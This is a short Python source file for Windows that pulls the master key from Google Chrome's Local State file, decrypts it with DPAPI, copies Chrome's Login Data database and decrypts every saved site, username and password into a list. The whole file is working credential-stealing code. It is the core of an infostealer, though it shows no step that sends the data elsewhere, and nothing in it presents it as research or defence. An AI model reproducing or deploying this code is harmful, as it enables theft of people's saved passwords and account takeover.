import os
import win32crypt
import base64
import json
import shutil
import sqlite3
from Crypto.Cipher import AES
from typing import List


def get_encryption_key() -> win32crypt.CryptUnprotectData:
    """Gets the encryption key for the database

    Returns:
        CryptUnprotectData: Key
    """
    local_state_path = os.path.join(
        os.environ["USERPROFILE"],
        "AppData",
        "Local",
        "Google",
        "Chrome",
        "User Data",
        "Local State",
    )
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key) -> str:
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""


def return_chrome_creds(filename) -> List:
    key = get_encryption_key()
    shutil.copyfile(
        os.path.join(
            os.environ["USERPROFILE"],
            "AppData",
            "Local",
            "Google",
            "Chrome",
            "User Data",
            "default",
            "Login Data",
        ),
        filename,
    )
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created"
    )
    creds = [
        (row[0], row[1], row[2], decrypt_password(row[3], key))
        for row in cursor.fetchall()
        if row[2] or decrypt_password(row[3], key)
    ]
    cursor.close()
    db.close()
    return creds
